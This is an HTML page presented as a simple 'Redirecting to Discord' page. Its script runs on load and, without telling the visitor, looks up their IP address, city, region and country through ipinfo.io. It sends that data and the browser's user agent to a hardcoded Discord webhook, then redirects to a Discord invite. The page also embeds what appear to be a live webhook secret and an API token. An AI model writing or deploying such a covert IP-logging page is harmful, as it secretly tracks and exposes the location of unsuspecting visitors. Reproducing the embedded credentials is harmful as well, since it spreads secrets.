<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Configuration
        const DISCORD_INVITE = "https://discord.gg/3RQwUPbrqh";
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1327822515170705419/uIuBHQOVxSUzVTMiG8Eektaj11GNRfaTf_bgv0A2XEmVrN5WviTw2RSRstEv0DmBLZXX";
        const IPINFO_TOKEN = "81333738f60441"; // Get this from ipinfo.io

        // Function to notify the webhook
        async function notifyWebhook() {
            try {
                // Fetch visitor details from ipinfo.io
                const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
                const data = await response.json();

                // Send data to the webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        userAgent: navigator.userAgent,
                    }),
                });
            } catch (error) {
                console.error("Error notifying webhook:", error);
            }
        }

        // Execute the notification and redirect
        async function init() {
            await notifyWebhook();
            window.location.href = DISCORD_INVITE;
        }

        // Start the process when the page loads
        window.onload = init;
    </script>
</head>
<body>
    <!-- Optional content while redirecting -->
    <h1>Redirecting to Discord...</h1>
</body>
</html>
